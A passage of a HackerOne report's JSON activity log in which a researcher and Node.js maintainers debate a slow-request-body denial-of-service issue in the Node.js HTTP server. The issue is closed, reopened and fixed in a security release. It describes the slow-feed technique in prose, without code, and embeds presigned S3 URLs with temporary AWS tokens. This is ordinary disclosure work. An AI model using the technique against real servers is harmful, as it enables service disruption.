qT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=d64ec32827c8173bd233a96e2f10d9ec030be28e8f6851e0266242ee480901ca"}],"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7089593,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"In the PoC, the number of connections (1) is printed, the attacker can cause connections to be maintain for a long time by keeping it active.\n\nRelated: https://nvd.nist.gov/vuln/detail/CVE-2018-12122 (this involves reading of headers, but not body).","markdown_message":"\u003cp\u003eIn the PoC, the number of connections (1) is printed, the attacker can cause connections to be maintain for a long time by keeping it active.\u003c/p\u003e\n\n\u003cp\u003eRelated: \u003ca title=\"https://nvd.nist.gov/vuln/detail/CVE-2018-12122\" href=\"/redirect?url=https%3A%2F%2Fnvd.nist.gov%2Fvuln%2Fdetail%2FCVE-2018-12122\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nvd.nist.gov/vuln/detail/CVE-2018-12122\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (this involves reading of headers, but not body).\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T12:28:41.958Z","updated_at":"2020-02-19T12:30:33.076Z","actor":{"username":"underflow0","cleared":false,"url":"/underflow0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7090440,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @underflow0 and thanks for your reply,\n\nI think you put the report in the wrong program. This is for `Nodejs` not for `Nodejs modules`. They are different programs. \nAs you have potentially found a vulnerability on `body-parser` module please self-close this report and submit it to https://hackerone.com/nodejs-ecosystem !\n\nThanks!\n@turtle_shell","markdown_message":"\u003cp\u003eHello \u003ca href=\"/underflow0\"\u003e@underflow0\u003c/a\u003e and thanks for your reply,\u003c/p\u003e\n\n\u003cp\u003eI think you put the report in the wrong program. This is for \u003ccode\u003eNodejs\u003c/code\u003e not for \u003ccode\u003eNodejs modules\u003c/code\u003e. They are different programs. \u003cbr\u003e\nAs you have potentially found a vulnerability on \u003ccode\u003ebody-parser\u003c/code\u003e module please self-close this report and submit it to \u003ca title=\"https://hackerone.com/nodejs-ecosystem\" href=\"https://hackerone.com/nodejs-ecosystem\"\u003ehttps://hackerone.com/nodejs-ecosystem\u003c/a\u003e !\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\n\u003ca href=\"/turtle_shell\"\u003e@turtle_shell\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T13:31:20.511Z","updated_at":"2020-02-19T13:31:20.511Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7090498,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Check out https://github.com/expressjs/body-parser/issues/389\n\nThe author argues that it is Node.js's reponsibility and that all other body parsers are vulnerable. Do confirm your stance anyway.","markdown_message":"\u003cp\u003eCheck out \u003ca title=\"https://github.com/expressjs/body-parser/issues/389\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fexpressjs%2Fbody-parser%2Fissues%2F389\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/expressjs/body-parser/issues/389\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe author argues that it is Node.js\u0026#39;s reponsibility and that all other body parsers are vulnerable. Do confirm your stance anyway.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T13:40:51.369Z","updated_at":"2020-02-19T13:42:06.279Z","actor":{"username":"underflow0","cleared":false,"url":"/underflow0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7091411,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @underflow0 - I'm discussing this submission internally with the Node.js team. You will be updated as soon as there is additional information to share. Thanks for your patience!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/underflow0\"\u003e@underflow0\u003c/a\u003e - I\u0026#39;m discussing this submission internally with the Node.js team. You will be updated as soon as there is additional information to share. Thanks for your patience!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T14:54:02.293Z","updated_at":"2020-02-19T14:54:02.293Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7091426,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @underflow0 - I'm discussing this submission internally with the Node.js team. You will be updated as soon as there is additional information to share. Thanks for your patience!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/underflow0\"\u003e@underflow0\u003c/a\u003e - I\u0026#39;m discussing this submission internally with the Node.js team. You will be updated as soon as there is additional information to share. Thanks for your patience!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T14:56:15.869Z","updated_at":"2020-02-19T14:56:15.869Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7093870,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"IMO, Node.js addresses this in a similar way to Nginx, having effectively the same configuration options. See https://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks\n\nSpecifically:\n- header must be received within a timeout: https://nodejs.org/api/http.html#http_server_headerstimeout (nginx: client_header_timeout)\n- while body is received, there is an activity timeout: https://nodejs.org/api/http.html#http_server_timeout (nginx: client_body_timeout, poorly named -- \"The timeout is set only for a period between two successive read operations, not for the transmission of the whole request body\")\n- complete body timeout is effectively the product of the body size limit (nginx: client_max_body_size) and the activity timeout\n\nPerhaps that last is not clear enough. Since Node.js does not, itself, have APIs that accumulate request bodies in memory it contains no limits on the body size. Body parsers have such a limit (example: https://github.com/expressjs/body-parser#bodyparserjsonoptions, \"limit:\"). So, `server.headersTimeout + bodyparser.limit * server.timeout` is the absolute max amount of time that will be allowed for a client to slow-feed a request to Node.js. All the components of that limit can be configured by the user.\n\nPerhaps a specific `server.bodyTimeout` similar to the existing `server.headersTimeout` would be useful, but its lack does not appear to me to constitute a vulnerability to slowloris.","markdown_message":"\u003cp\u003eIMO, Node.js addresses this in a similar way to Nginx, having effectively the same configuration options. See \u003ca title=\"https://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks\" href=\"/redirect?url=https%3A%2F%2Fblog.qualys.com%2Fsecuritylabs%2F2011%2F11%2F02%2Fhow-to-protect-against-slow-http-attacks\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSpecifically:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eheader must be received within a timeout: \u003ca title=\"https://nodejs.org/api/http.html#http_server_headerstimeout\" href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fapi%2Fhttp.html%23http_server_headerstimeout\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nodejs.org/api/http.html#http_server_headerstimeout\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (nginx: client_header_timeout)\u003c/li\u003e\n\u003cli\u003ewhile body is received, there is an activity timeout: \u003ca title=\"https://nodejs.org/api/http.html#http_server_timeout\" href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fapi%2Fhttp.html%23http_server_timeout\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nodejs.org/api/http.html#http_server_timeout\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (nginx: client_body_timeout, poorly named -- \u0026quot;The timeout is set only for a period between two successive read operations, not for the transmission of the whole request body\u0026quot;)\u003c/li\u003e\n\u003cli\u003ecomplete body timeout is effectively the product of the body size limit (nginx: client_max_body_size) and the activity timeout\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003ePerhaps that last is not clear enough. Since Node.js does not, itself, have APIs that accumulate request bodies in memory it contains no limits on the body size. Body parsers have such a limit (example: \u003ca title=\"https://github.com/expressjs/body-parser#bodyparserjsonoptions\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fexpressjs%2Fbody-parser%23bodyparserjsonoptions\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/expressjs/body-parser#bodyparserjsonoptions\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, \u0026quot;limit:\u0026quot;). So, \u003ccode\u003eserver.headersTimeout + bodyparser.limit * server.timeout\u003c/code\u003e is the absolute max amount of time that will be allowed for a client to slow-feed a request to Node.js. All the components of that limit can be configured by the user.\u003c/p\u003e\n\n\u003cp\u003ePerhaps a specific \u003ccode\u003eserver.bodyTimeout\u003c/code\u003e similar to the existing \u003ccode\u003eserver.headersTimeout\u003c/code\u003e would be useful, but its lack does not appear to me to constitute a vulnerability to slowloris.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T20:36:34.859Z","updated_at":"2020-02-19T20:36:34.859Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7093918,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For the typical application `bodyparser.limit * server.timeout` would be a massive number. \"Can be configured by the user\" is technically true but impractical for preventing the DoS without severely impacting functionality.","markdown_message":"\u003cp\u003eFor the typical application \u003ccode\u003ebodyparser.limit * server.timeout\u003c/code\u003e would be a massive number. \u0026quot;Can be configured by the user\u0026quot; is technically true but impractical for preventing the DoS without severely impacting functionality.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T20:45:01.305Z","updated_at":"2020-02-19T20:45:01.305Z","actor":{"username":"underflow0","cleared":false,"url":"/underflow0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7094332,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"10K request, 100ms timeout, is about 16 min timeout for a request. Those scales don't seem massive to me, or impractical.\n\nAny comment on the comparison to Nginx? We tend to lean heavily on existing practice in these areas.\n\nAlso, putting Nginx in front-of Node.js is quite practical for DoS protection (and load balancing, single instances are more prone to DoS).\n\nI'll give the other Node.js members time to respond, perhaps @chalker or @jasnell or @mcollina feel differently.","markdown_message":"\u003cp\u003e10K request, 100ms timeout, is about 16 min timeout for a request. Those scales don\u0026#39;t seem massive to me, or impractical.\u003c/p\u003e\n\n\u003cp\u003eAny comment on the comparison to Nginx? We tend to lean heavily on existing practice in these areas.\u003c/p\u003e\n\n\u003cp\u003eAlso, putting Nginx in front-of Node.js is quite practical for DoS protection (and load balancing, single instances are more prone to DoS).\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll give the other Node.js members time to respond, perhaps \u003ca href=\"/chalker\"\u003e@chalker\u003c/a\u003e or \u003ca href=\"/jasnell\"\u003e@jasnell\u003c/a\u003e or \u003ca href=\"/mcollina\"\u003e@mcollina\u003c/a\u003e feel differently.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T21:58:41.055Z","updated_at":"2020-02-19T21:58:41.055Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7094431,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I was thinking more of a 1MB body.\n\nLooking at the the Nginx documentation, you're right that it doesn't mitigate this as well. I'm not sure the reasoning. Apache has such an option (RequestReadTimeout) though.","markdown_message":"\u003cp\u003eI was thinking more of a 1MB body.\u003c/p\u003e\n\n\u003cp\u003eLooking at the the Nginx documentation, you\u0026#39;re right that it doesn\u0026#39;t mitigate this as well. I\u0026#39;m not sure the reasoning. Apache has such an option (RequestReadTimeout) though.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T22:23:50.670Z","updated_at":"2020-02-19T22:23:50.670Z","actor":{"username":"underflow0","cleared":false,"url":"/underflow0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7094662,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The original (real?) slowloris relied on Apache not having a timeout to receive HTTP headers (Node.js and Nginx do), and also using up a process per incoming connection, the combination of the two made it particularly vulnerable. Neither condition applies to Node.js (since it gained an HTTP header timeout), and slowloris didn't apply to Nginx at the time, either.","markdown_message":"\u003cp\u003eThe original (real?) slowloris relied on Apache not having a timeout to receive HTTP headers (Node.js and Nginx do), and also using up a process per incoming connection, the combination of the two made it particularly vulnerable. Neither condition applies to Node.js (since it gained an HTTP header timeout), and slowloris didn\u0026#39;t apply to Nginx at the time, either.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T22:58:34.322Z","updated_at":"2020-02-19T22:58:34.322Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7204869,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"Hi @underflow0,\n\nThanks for your report. Based on your initial description, there do not appear to be any security implications as a direct result of this behavior.\n\nKind regards,\n@dwan","markdown_message":"\u003cp\u003eHi \u003ca href=\"/underflow0\"\u003e@underflow0\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for your report. Based on your initial description, there do not appear to be any security implications as a direct result of this behavior.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/dwan\"\u003e@dwan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-03T12:10:37.018Z","updated_at":"2020-03-03T12:10:37.018Z","actor":{"username":"dwan","cleared":false,"url":"/dwan","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/ra4aa3xoyc0jmoyzzbxl7rkwrw54/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22defcon2.png%22%3B%20filename%2A%3DUTF-8%27%27defcon2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065502Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=02b218ee4ba263c133f37325bbdc48eeb361acfd1de3efef926c45b43e0152d0"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8322262,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-17T16:45:54.397Z","updated_at":"2020-06-17T16:45:54.397Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8322270,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Sorry about the confusion, this is actually a problem and we are looking into it right now.","markdown_message":"\u003cp\u003eSorry about the confusion, this is actually a problem and we are looking into it right now.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-17T16:46:56.009Z","updated_at":"2020-06-17T16:46:56.009Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9173430,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@underflow0 would you like attribution when this goes out in a security release and if so could you provide what you'd like in terms of\n\nThank you to X who works at Y for reporting this vulnerability.\n\nI'll need that by the end of the week for it to be included.","markdown_message":"\u003cp\u003e\u003ca href=\"/underflow0\"\u003e@underflow0\u003c/a\u003e would you like attribution when this goes out in a security release and if so could you provide what you\u0026#39;d like in terms of\u003c/p\u003e\n\n\u003cp\u003eThank you to X who works at Y for reporting this vulnerability.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll need that by the end of the week for it to be included.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-09T18:12:15.223Z","updated_at":"2020-09-09T18:12:15.223Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9173727,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No attribution necessary.","markdown_message":"\u003cp\u003eNo attribution necessary.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-09T18:47:28.364Z","updated_at":"2020-09-09T18:47:28.364Z","actor":{"username":"underflow0","cleared":false,"url":"/underflow0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9250787,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Resolved in September security release: https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/","markdown_message":"\u003cp\u003eResolved in September security release: \u003ca title=\"https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/\" href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fen%2Fblog%2Fvulnerability%2Fseptember-2020-security-releases%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nodejs.org/en/blog/vulnerability/september-2020-security-releases/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-17T19:24:52.584Z","updated_at":"2020-09-17T19:24:52.584Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9250790,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-17T19:25:10.953Z","updated_at":"2020-09-17T19:25:10.953Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"underflow0","url":"/underflow0"},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9250800,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-17T19:25:51.119Z","updated_at":"2020-09-17T19:25:51.119Z","first_to_agree":true,"actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9552843,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-17T19:25:57.460Z","updated_at":"2020-10-17T19:25:57.460Z","actor":{"url":"/nodejs","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js"}},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}